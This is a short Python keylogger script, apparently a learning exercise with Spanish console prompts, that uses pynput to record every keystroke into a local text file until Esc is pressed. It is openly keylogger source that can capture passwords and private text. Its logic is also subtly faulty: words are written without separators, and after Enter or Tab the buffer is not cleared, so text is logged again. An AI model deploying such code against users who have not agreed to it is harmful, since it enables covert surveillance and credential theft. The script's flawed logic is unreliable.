from pynput import keyboard

log_file = "loggin.txt"
current_word = ""

def log(word):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(word)

def on_press(key):
    global current_word
    try:
        if key.char is not None:
            current_word += key.char
    
    except AttributeError:
        if key == keyboard.Key.space:
            if current_word:
                log(current_word)
                current_word = ""

        elif key == keyboard.Key.enter:
            if current_word:
                log(current_word)
                current_word += "\n"

        elif key == keyboard.Key.tab:
            if current_word:
                log(current_word)
                current_word += "\t"

        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.alt:
            pass
        
        elif key == keyboard.Key.backspace and len(current_word) == 0:
            pass
        elif key == keyboard.Key.backspace and len(current_word) > 0:
            current_word = current_word[:-1]

def on_release(key):
    if key == keyboard.Key.esc:
        if current_word:
            log(current_word)
        return False

print("Escuchando... Presiona teclas para capturar")
print("Presiona 'Esc' para parar y ver las palabras.")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
    ) as listener:
    listener.join()

words = current_word.split()


print("\n--- Texto Capturado ---")
print(f"Número de palabras: {len(words)}")
print(f"{current_word}")
